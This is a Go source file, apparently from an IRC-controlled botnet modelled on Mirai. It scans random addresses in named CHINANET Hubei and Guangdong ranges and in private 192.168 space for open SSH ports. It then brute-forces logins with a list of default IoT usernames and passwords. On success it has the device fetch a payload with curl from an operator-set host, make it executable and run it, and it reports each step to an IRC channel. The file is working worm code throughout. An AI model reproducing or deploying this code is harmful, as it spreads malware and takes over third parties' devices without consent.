package tools

import (
	"bytes"
	"fmt"
	"math/rand"
	"net"
	"time"

	"golang.org/x/crypto/ssh"
)

var Scan_Switch bool

/*
If you don't know how to add more IP range or Usernames and Passwords.
You can watch it in original github page. ~> https://github.com/R4bin/
(In case that you didn't download from github page.)
*/

const (
	//CHINANET Hubei province network
	chpn1 = "116." //116.208.0.0 - 116.211.255.255
	chpn2 = "119." //119.96.0.0 - 119.103.255.255
	chpn3 = "58."  //58.48.0.0 - 58.55.255.255
	chpn4 = "221." //221.232.0.0 - 221.235.255.255
	chpn5 = "27."  //27.16.0.0 - 27.31.255.255

	//CHINANET Guangdong province network
	cgpn1 = "113." //113.96.0.0 - 113.111.255.255
	cgpn2 = "121." //121.8.0.0 - 121.15.255.255
	cgpn3 = "125." //125.88.0.0 - 125.95.255.255
	cgpn4 = "14."  //14.112.0.0 - 14.127.255.255
	cgpn5 = "183." //183.0.0.0 - 183.63.255.255
	cgpn6 = "124." //124.172.0.0 - 124.175.255.255

	//Private ip
	priv = "192." //192.168.0.0 - 192.168.255.255

	//Blacklist ip
	bl1 = "192.168.1.1:22"
	bl2 = "192.168.1.16:22"
)

func GenRange(max, min int) string {
	rand.Seed(time.Now().UnixNano())
	return fmt.Sprint(rand.Intn(max+1-min) + min)
}

func ManageIP_range(mainRange, setRange string) string {
	var ipGen []string
	ipGen = append(ipGen, mainRange)
	ipGen = append(ipGen, setRange, ".")

	for i := 0; i < 2; i++ {
		ipGen = append(ipGen, GenRange(255, 0), ".")
	}

	ipGen[len(ipGen)-1] = ""
	ipGen = append(ipGen, ":22")
	return ipGen[0] + ipGen[1] + ipGen[2] + ipGen[3] +
		ipGen[4] + ipGen[5] + ipGen[6] + ipGen[7]
}

func NextIP(ipRange string) string {
	switch ipRange {
	case chpn1:
		return ManageIP_range(ipRange, GenRange(211, 208))
	case chpn2:
		return ManageIP_range(ipRange, GenRange(103, 96))
	case chpn3:
		return ManageIP_range(ipRange, GenRange(55, 48))
	case chpn4:
		return ManageIP_range(ipRange, GenRange(235, 232))
	case chpn5:
		return ManageIP_range(ipRange, GenRange(31, 16))
	case cgpn1:
		return ManageIP_range(ipRange, GenRange(111, 96))
	case cgpn2:
		return ManageIP_range(ipRange, GenRange(15, 8))
	case cgpn3:
		return ManageIP_range(ipRange, GenRange(95, 88))
	case cgpn4:
		return ManageIP_range(ipRange, GenRange(127, 112))
	case cgpn5:
		return ManageIP_range(ipRange, GenRange(63, 0))
	case cgpn6:
		return ManageIP_range(ipRange, GenRange(175, 172))
	case priv:
		return ManageIP_range(ipRange, GenRange(168, 168))
	}
	return ""
}

func CheckPort(_ipRange string) string {
	ptrIP := &_ipRange
	conn, err := net.DialTimeout("tcp", *ptrIP, 200*time.Millisecond)
	if err != nil {
		return ""
	}
	conn.Close()
	return *ptrIP
}

func SSH_Config(ssh_name, ssh_pass string) *ssh.ClientConfig {
	config := &ssh.ClientConfig{
		User: ssh_name,
		Auth: []ssh.AuthMethod{
			ssh.Password(ssh_pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	return config
}

func SSH_Session(ssh_session *ssh.Client, command string) {
	session, _ := ssh_session.NewSession()
	var set_session bytes.Buffer
	session.Stdout = &set_session
	session.Run(command)
	session.Close()
}

func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
	NetArr := []string{
		chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
		cgpn4, cgpn5, cgpn6, priv,
	}

	/*
		Thank mirai for these usernames and passwords list. (You are my inspirelation.)
		You can add more if you want.
	*/
	userList := []string{
		"admin", "root", "user", "guest", "support", "login",
	}

	passList := []string{
		"", "root", "admin", "123456", "password", "default", "54321", "888888",
		"1111", "1111111", "1234", "12345", "pass", "xc3511", "vizxv", "xmhdipc",
		"juantech", "user", "admin1234", "666666", "klv123", "klv1234", "Zte521", "hi3518",
		"jvbzd", "7ujMko0vizxv", "7ujMko0admin", "ikwb", "system", "realtek", "00000000", "smcadmin",
		"123456789", "12345678", "111111", "123123", "1234567890", "login", "supoort", "guest",
	}

	for {
		for i := range NetArr {
			target := NextIP(NetArr[i])
			ptrTarget := &target
			turnRange := CheckPort(*ptrTarget)

			if target == bl1 || target == bl2 {
				break
			}

			if turnRange == "" {
				IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :"+target+" SSH not found.")
				CheckPort(target)
			} else {
				IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Try to login to "+turnRange)
				var logCheck bool

				for i := range userList {
					for j := range passList {
						_session, err := ssh.Dial("tcp", turnRange, SSH_Config(userList[i], passList[j]))
						if err == nil {
							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Login success at "+turnRange)
							SSH_Session(_session, "curl -o ."+set_payload+" "+set_FTP+" --silent")
							time.Sleep(10 * time.Second)
							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :\"curl\" Success on "+turnRange)
							SSH_Session(_session, "chmod +x ."+set_payload)
							go SSH_Session(_session, "./."+set_payload+" &")
							logCheck = true
							break
						} else {
							IRC_Send(reportIRC, "PRIVMSG "+set_chan+" :Failed to login to "+turnRange+
								" > "+fmt.Sprintf("%v", userList[i])+":"+fmt.Sprintf("%v", passList[j]))
						}
					}
					if logCheck || Scan_Switch {
						break
					}
				}
				continue
			}
		}
		if Scan_Switch {
			break
		}
	}
}
